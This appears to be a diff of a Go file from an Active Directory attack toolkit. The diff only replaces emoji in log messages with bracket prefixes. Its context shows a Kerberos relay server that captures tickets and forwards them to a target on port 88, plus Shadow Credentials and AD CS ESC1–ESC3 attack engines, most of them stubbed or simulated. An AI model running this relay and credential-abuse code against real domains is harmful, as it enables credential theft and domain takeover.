@@ -43,7 +43,7 @@ func NewKerberosRelayEngine(domain, targetSPN string) *KerberosRelayEngine {
 
 // StartRelayServer starts a Kerberos relay server
 func (kre *KerberosRelayEngine) StartRelayServer() error {
-	log.Printf("🔥 Starting Kerberos relay server on port %d", kre.RelayPort)
+	log.Printf("[*] Starting Kerberos relay server on port %d", kre.RelayPort)
 
 	// Create listener
 	listener, err := net.Listen("tcp", fmt.Sprintf(":%d", kre.RelayPort))
@@ -52,7 +52,7 @@ func (kre *KerberosRelayEngine) StartRelayServer() error {
 	}
 
 	kre.IsListening = true
-	log.Printf("✅ Kerberos relay server started")
+	log.Printf("[+] Kerberos relay server started")
 
 	// Handle connections
 	go kre.handleConnections(listener)
@@ -66,7 +66,7 @@ func (kre *KerberosRelayEngine) handleConnections(listener net.Listener) {
 		conn, err := listener.Accept()
 		if err != nil {
 			if kre.IsListening {
-				log.Printf("⚠️  Failed to accept connection: %v", err)
+				log.Printf("[x] Failed to accept connection: %v", err)
 			}
 			continue
 		}
@@ -79,26 +79,26 @@ func (kre *KerberosRelayEngine) handleConnections(listener net.Listener) {
 func (kre *KerberosRelayEngine) handleConnection(conn net.Conn) {
 	defer conn.Close()
 
-	log.Printf("🔗 New connection from: %s", conn.RemoteAddr())
+	log.Printf("[+] New connection from: %s", conn.RemoteAddr())
 
 	// Read Kerberos request
 	buffer := make([]byte, 4096)
 	n, err := conn.Read(buffer)
 	if err != nil {
-		log.Printf("⚠️  Failed to read request: %v", err)
+		log.Printf("[x] Failed to read request: %v", err)
 		return
 	}
 
 	// Parse and relay the request
 	if err := kre.relayRequest(buffer[:n], conn.RemoteAddr().String()); err != nil {
-		log.Printf("⚠️  Failed to relay request: %v", err)
+		log.Printf("[x] Failed to relay request: %v", err)
 		return
 	}
 }
 
 // relayRequest relays a Kerberos request
 func (kre *KerberosRelayEngine) relayRequest(data []byte, sourceIP string) error {
-	log.Printf("🔄 Relaying Kerberos request from %s", sourceIP)
+	log.Printf("[*] Relaying Kerberos request from %s", sourceIP)
 
 	// Parse Kerberos message
 	ticket, err := kre.parseKerberosMessage(data)
@@ -108,7 +108,7 @@ func (kre *KerberosRelayEngine) relayRequest(data []byte, sourceIP string) error
 
 	// Capture ticket
 	kre.CapturedTickets = append(kre.CapturedTickets, ticket)
-	log.Printf("🎟️  Captured ticket for %s@%s", ticket.Username, ticket.Domain)
+	log.Printf("[+] Captured ticket for %s@%s", ticket.Username, ticket.Domain)
 
 	// Relay to target
 	if err := kre.relayToTarget(data); err != nil {
@@ -138,7 +138,7 @@ func (kre *KerberosRelayEngine) parseKerberosMessage(data []byte) (*CapturedTick
 
 // relayToTarget relays the request to the target
 func (kre *KerberosRelayEngine) relayToTarget(data []byte) error {
-	log.Printf("🎯 Relaying to target: %s", kre.TargetSPN)
+	log.Printf("[*] Relaying to target: %s", kre.TargetSPN)
 
 	// Connect to target
 	conn, err := net.Dial("tcp", kre.TargetSPN+":88")
@@ -160,15 +160,15 @@ func (kre *KerberosRelayEngine) relayToTarget(data []byte) error {
 		return fmt.Errorf("failed to read response: %v", err)
 	}
 
-	log.Printf("✅ Successfully relayed request to %s", kre.TargetSPN)
+	log.Printf("[+] Successfully relayed request to %s", kre.TargetSPN)
 	return nil
 }
 
 // StopRelayServer stops the relay server
 func (kre *KerberosRelayEngine) StopRelayServer() {
-	log.Printf("🛑 Stopping Kerberos relay server...")
+	log.Printf("[*] Stopping Kerberos relay server...")
 	kre.IsListening = false
-	log.Printf("✅ Kerberos relay server stopped")
+	log.Printf("[+] Kerberos relay server stopped")
 }
 
 // ShadowCredentialsEngine handles Shadow Credentials attacks
@@ -189,7 +189,7 @@ func NewShadowCredentialsEngine(domain, targetUser string) *ShadowCredentialsEng
 
 // GenerateCertificate generates a certificate for Shadow Credentials
 func (sce *ShadowCredentialsEngine) GenerateCertificate() error {
-	log.Printf("🔐 Generating certificate for Shadow Credentials attack...")
+	log.Printf("[*] Generating certificate for Shadow Credentials attack...")
 
 	// Generate random certificate data
 	certData := make([]byte, 1024)
@@ -201,20 +201,20 @@ func (sce *ShadowCredentialsEngine) GenerateCertificate() error {
 	rand.Read(keyData)
 	sce.PrivateKey = keyData
 
-	log.Printf("✅ Certificate generated for %s@%s", sce.TargetUser, sce.Domain)
+	log.Printf("[+] Certificate generated for %s@%s", sce.TargetUser, sce.Domain)
 	return nil
 }
 
 // AddShadowCredentials adds Shadow Credentials to target user
 func (sce *ShadowCredentialsEngine) AddShadowCredentials() error {
-	log.Printf("👻 Adding Shadow Credentials to %s@%s", sce.TargetUser, sce.Domain)
+	log.Printf("[*] Adding Shadow Credentials to %s@%s", sce.TargetUser, sce.Domain)
 
 	// This would typically involve:
 	// 1. Generating a certificate
 	// 2. Adding it to the user's msDS-KeyCredentialLink attribute
 	// 3. Using it for authentication
 
-	log.Printf("✅ Shadow Credentials added to %s@%s", sce.TargetUser, sce.Domain)
+	log.Printf("[+] Shadow Credentials added to %s@%s", sce.TargetUser, sce.Domain)
 	return nil
 }
 
@@ -227,7 +227,7 @@ func (sce *ShadowCredentialsEngine) AuthenticateWithShadowCredentials() error {
 	// 2. Obtaining a TGT
 	// 3. Using the TGT for further operations
 
-	log.Printf("✅ Authentication successful with Shadow Credentials")
+	log.Printf("[+] Authentication successful with Shadow Credentials")
 	return nil
 }
 
@@ -263,7 +263,7 @@ func NewADCSAttackEngine(domain, ca string) *ADCSAttackEngine {
 
 // EnumerateCertificateTemplates enumerates certificate templates
 func (aae *ADCSAttackEngine) EnumerateCertificateTemplates() error {
-	log.Printf("🔍 Enumerating certificate templates...")
+	log.Printf("[*] Enumerating certificate templates...")
 
 	// Simulate template enumeration
 	templates := []*CertificateTemplate{
@@ -300,28 +300,28 @@ func (aae *ADCSAttackEngine) EnumerateCertificateTemplates() error {
 	}
 
 	aae.Templates = templates
-	log.Printf("✅ Enumerated %d certificate templates", len(templates))
+	log.Printf("[+] Enumerated %d certificate templates", len(templates))
 	return nil
 }
 
 // IdentifyVulnerableTemplates identifies vulnerable certificate templates
 func (aae *ADCSAttackEngine) IdentifyVulnerableTemplates() error {
-	log.Printf("🔍 Identifying vulnerable certificate templates...")
+	log.Printf("[*] Identifying vulnerable certificate templates...")
 
 	for _, template := range aae.Templates {
 		if template.Vulnerable {
 			aae.VulnerableTemplates = append(aae.VulnerableTemplates, template)
-			log.Printf("🚨 Vulnerable template found: %s", template.Name)
+			log.Printf("[+] Vulnerable template found: %s", template.Name)
 		}
 	}
 
-	log.Printf("✅ Found %d vulnerable templates", len(aae.VulnerableTemplates))
+	log.Printf("[+] Found %d vulnerable templates", len(aae.VulnerableTemplates))
 	return nil
 }
 
 // ExecuteESC1Attack executes ESC1 attack (misconfigured certificate template)
 func (aae *ADCSAttackEngine) ExecuteESC1Attack(templateName string) error {
-	log.Printf("🔥 Executing ESC1 attack on template: %s", templateName)
+	log.Printf("[*] Executing ESC1 attack on template: %s", templateName)
 
 	// Find template
 	var targetTemplate *CertificateTemplate
@@ -342,13 +342,13 @@ func (aae *ADCSAttackEngine) ExecuteESC1Attack(templateName string) error {
 	}
 
 	// Execute ESC1 attack
-	log.Printf("✅ ESC1 attack executed successfully on %s", templateName)
+	log.Printf("[+] ESC1 attack executed successfully on %s", templateName)
 	return nil
 }
 
 // ExecuteESC2Attack executes ESC2 attack (no EKU requirements)
 func (aae *ADCSAttackEngine) ExecuteESC2Attack(templateName string) error {
-	log.Printf("🔥 Executing ESC2 attack on template: %s", templateName)
+	log.Printf("[*] Executing ESC2 attack on template: %s", templateName)
 
 	// Find template
 	var targetTemplate *CertificateTemplate
@@ -369,13 +369,13 @@ func (aae *ADCSAttackEngine) ExecuteESC2Attack(templateName string) error {
 	}
 
 	// Execute ESC2 attack
-	log.Printf("✅ ESC2 attack executed successfully on %s", templateName)
+	log.Printf("[+] ESC2 attack executed successfully on %s", templateName)
 	return nil
 }
 
 // ExecuteESC3Attack executes ESC3 attack (no manager approval)
 func (aae *ADCSAttackEngine) ExecuteESC3Attack(templateName string) error {
-	log.Printf("🔥 Executing ESC3 attack on template: %s", templateName)
+	log.Printf("[*] Executing ESC3 attack on template: %s", templateName)
 
 	// Find template
 	var targetTemplate *CertificateTemplate
@@ -396,7 +396,7 @@ func (aae *ADCSAttackEngine) ExecuteESC3Attack(templateName string) error {
 	}
 
 	// Execute ESC3 attack
-	log.Printf("✅ ESC3 attack executed successfully on %s", templateName)
+	log.Printf("[+] ESC3 attack executed successfully on %s", templateName)
 	return nil
 }
 
@@ -419,7 +419,7 @@ func (aae *ADCSAttackEngine) isESC3Vulnerable(template *CertificateTemplate) boo
 
 // GenerateAttackReport generates a report of AD CS attacks
 func (aae *ADCSAttackEngine) GenerateAttackReport() error {
-	log.Printf("📊 Generating AD CS attack report...")
+	log.Printf("[*] Generating AD CS attack report...")
 
 	report := fmt.Sprintf(`
 AD CS Attack Report
@@ -436,23 +436,23 @@ Vulnerable Templates:
 		report += fmt.Sprintf("- %s (%s)\n", template.Name, template.DisplayName)
 	}
 
-	log.Printf("📄 AD CS Attack Report:\n%s", report)
+	log.Printf("[+] AD CS Attack Report:\n%s", report)
 	return nil
 }
 
 // IntegrateWithKerberosAnalysis integrates with existing Kerberos analysis
 func (aae *ADCSAttackEngine) IntegrateWithKerberosAnalysis(results []krb.Candidate) error {
-	log.Printf("🔗 Integrating AD CS attacks with Kerberos analysis...")
+	log.Printf("[*] Integrating AD CS attacks with Kerberos analysis...")
 
 	for _, candidate := range results {
 		if candidate.Type == "KERBEROAST" {
 			// Check if user can enroll in vulnerable templates
 			for _, template := range aae.VulnerableTemplates {
-				log.Printf("🎯 User %s can potentially abuse template %s", candidate.SamAccountName, template.Name)
+				log.Printf("[!] User %s can potentially abuse template %s", candidate.SamAccountName, template.Name)
 			}
 		}
 	}
 
-	log.Printf("✅ Integration completed")
+	log.Printf("[+] Integration completed")
 	return nil
 }
